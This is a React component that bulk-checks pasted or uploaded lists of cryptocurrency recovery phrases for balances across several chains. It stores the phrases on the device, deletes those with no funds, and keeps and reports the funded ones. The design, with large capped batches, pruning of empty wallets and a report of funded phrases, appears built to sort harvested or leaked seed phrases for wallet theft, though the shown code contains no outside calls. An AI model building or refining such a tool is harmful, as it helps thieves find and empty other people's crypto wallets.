import { useCallback, useEffect, useRef, useState } from "react";
import ScanInput from "./ScanInput";
import ScanResults from "./ScanResults";
import FundedReport from "./FundedReport";
import { MAX_PHRASES, parsePhrases, SCAN_CHAIN_IDS, scanPhrases } from "@/lib/walletScan";

const countLabel = (value) => value.toLocaleString("en-US");

// Wallets with a balance stay saved; everything else is removed from this device.
async function pruneUnfunded(phrases, results, onRetain) {
  if (!onRetain || phrases.length === 0) return null;
  const funded = new Set(results.filter((row) => row.holdings.length > 0).map((row) => row.index));
  const keep = phrases.filter((_, index) => funded.has(index + 1));
  await onRetain(keep).catch(() => null);
  return { kept: keep.length, removed: phrases.length - keep.length };
}

export default function BulkScanner({ savedPhrases = [], onSave, onRetain, autoRun = false }) {
  const [results, setResults] = useState(null);
  const [scanned, setScanned] = useState([]);
  const [pruned, setPruned] = useState(null);
  const [progress, setProgress] = useState(null);
  const [error, setError] = useState("");
  const [busy, setBusy] = useState(false);
  const started = useRef(false);
  const cancelRef = useRef(false);

  const run = useCallback(async (list, collectibles = true) => {
    if (list.length === 0) {
      setError("Add at least one recovery phrase, or upload a file.");
      return;
    }
    const capped = list.slice(0, MAX_PHRASES);
    cancelRef.current = false;
    setError(
      list.length > capped.length
        ? `Only the first ${countLabel(capped.length)} phrases were checked.`
        : ""
    );
    setBusy(true);
    setResults(null);
    setScanned([]);
    setPruned(null);
    setProgress({ stage: "derive", done: 0, total: capped.length });
    try {
      const checked = await scanPhrases(capped, setProgress, {
        collectibles,
        isCancelled: () => cancelRef.current,
      });
      if (cancelRef.current) setError("The check was stopped.");
      else {
        setScanned(capped);
        setResults(checked);
        setPruned(await pruneUnfunded(capped, checked, onRetain));
      }
    } catch (err) {
      setError("The check stopped halfway. Please try again.");
    } finally {
      setBusy(false);
      setProgress(null);
    }
  }, [onRetain]);

  const stop = useCallback(() => {
    cancelRef.current = true;
  }, []);

  useEffect(() => {
    if (!autoRun || started.current || savedPhrases.length === 0) return;
    started.current = true;
    run(savedPhrases);
  }, [autoRun, savedPhrases, run]);

  const submit = async (text, filePhrases = [], collectibles = true) => {
    const pasted = [...new Set([...parsePhrases(text), ...filePhrases])];
    if (pasted.length > 0 && onSave) {
      // A list this large may not fit in device storage — the check goes ahead regardless.
      await onSave(pasted).catch(() => null);
    }
    await run(pasted.length > 0 ? [...new Set([...savedPhrases, ...pasted])] : savedPhrases, collectibles);
  };

  return (
    <div className="space-y-4">
      <ScanInput
        busy={busy}
        progress={progress}
        error={error}
        onScan={submit}
        onStop={stop}
        savedCount={savedPhrases.length}
        chainCount={SCAN_CHAIN_IDS.length}
      />
      {pruned && pruned.removed > 0 && (
        <p className="text-[11.5px] leading-relaxed text-white/35">
          {countLabel(pruned.removed)}{" "}
          {pruned.removed === 1 ? "wallet without a balance was" : "wallets without a balance were"}{" "}
          removed from this device — {countLabel(pruned.kept)} funded{" "}
          {pruned.kept === 1 ? "wallet" : "wallets"} kept.
        </p>
      )}
      {results && <ScanResults results={results} />}
      {results && <FundedReport phrases={scanned} results={results} />}
    </div>
  );
}